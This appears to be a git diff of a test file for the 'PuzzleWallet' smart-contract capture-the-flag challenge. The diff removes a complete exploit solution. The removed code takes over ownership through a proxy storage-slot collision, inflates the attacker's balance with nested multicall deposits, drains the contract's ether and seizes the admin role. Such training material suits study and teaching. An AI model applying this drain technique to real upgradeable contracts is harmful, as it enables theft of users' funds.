@@ -42,59 +42,7 @@ describe('[Challenge] PuzzleWallet', function () {
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        console.log(`\t [Info]`);
-        console.log(`\t Proxy          : ${this.target.address}`);
-        console.log(`\t Implementation : ${this.implement.address}`);
-        console.log(`\t Attcker        : ${attacker.address}`);
-
-        console.log(`\n\t [Proxy storage]`);
-        console.log(`\t pendingAdmin: ${await this.target.pendingAdmin()}`);
-        console.log(`\t admin       : ${await this.target.admin()}`);
-
-        console.log(`\t [Implementation storage]`);
-        console.log(`\t owner       : ${await this.targetImplementation.owner()}`);// same location as pendingAdmin
-        let maxBalance = await this.targetImplementation.maxBalance()
-        console.log(`\t maxBalance  : ${ethers.utils.hexlify(maxBalance)}`); // same location as admin
-        console.log(`\t maxBalance  : ${ethers.utils.formatEther(maxBalance)} ether`);                       // same location as admin
-
-        console.log(`\n\t [Before exploit]`);
-        console.log(`\t contract balance: ${ethers.utils.formatEther(await ethers.provider.getBalance(this.target.address))} ether`);
-        console.log(`\t Is whitelisted: ${await this.targetImplementation.whitelisted(attacker.address)}`);
-
-        console.log(`\n\t [Exploit]`);
-        console.log(`\t changing owner by executing proposeNewAdmin()...`);
-        let getOwnerTX = await this.target.connect(attacker).proposeNewAdmin(attacker.address); await getOwnerTX.wait(); // change owner to attacker
-        console.log(`\t owner : ${await this.targetImplementation.owner()}`);
-        console.log(`\t adding attacker to whitelist...`);
-        let addTX = await this.targetImplementation.connect(attacker).addToWhitelist(attacker.address); await addTX.wait();
-        console.log(`\t Is whitelisted: ${await this.targetImplementation.whitelisted(attacker.address)}`);
-        console.log(`\t draining ether...`);
-        console.log(`\t attacker balance before: ${ethers.utils.formatEther(await this.targetImplementation.balances(attacker.address))} ether`);
-        let ABI = ["function deposit()", "function multicall(bytes[] calldata data)"];
-        let iface = new ethers.utils.Interface(ABI);
-        let dataDeposit = iface.encodeFunctionData("deposit", []);
-        let dataMultiCall = iface.encodeFunctionData("multicall", [[dataDeposit]]);
-        let contractBalance = await ethers.provider.getBalance(this.target.address);
-        let multiDepositTX = await this.targetImplementation.connect(attacker).multicall(
-            [dataMultiCall, dataMultiCall], 
-            {value:contractBalance}
-        ); await multiDepositTX.wait();
-        let attackerBalance = parseInt(await this.targetImplementation.balances(attacker.address));
-        contractBalance = await ethers.provider.getBalance(this.target.address);
-        console.log(`\t attacker balance after   : ${ethers.utils.formatEther(attackerBalance)} ether`);
-        console.log(`\t current contract balance : ${ethers.utils.formatEther(contractBalance)} ether`);
-        if (attackerBalance > contractBalance) attackerBalance = contractBalance;
-        console.log(`\t withdrawing ${ethers.utils.formatEther(attackerBalance)} ether...`);
-        let withdrawTX = await this.targetImplementation.connect(attacker).execute(
-            attacker.address, 
-            attackerBalance, 
-            [],
-            {gasLimit:2000000}
-        ); await withdrawTX.wait();
-        console.log(`\t changing admin address by executing setMaxBalance()...`);
-        let setMaxBalanceTX = await this.targetImplementation.connect(attacker).setMaxBalance(attacker.address,{gasLimit:2000000}); await setMaxBalanceTX.wait();
-        console.log(`\t admin : ${await this.target.admin()}`);
-        console.log(`\t contract balance: ${ethers.utils.formatEther(await ethers.provider.getBalance(this.target.address))} ETH`);
+        
     }).timeout(0);
 
     after(async () => {
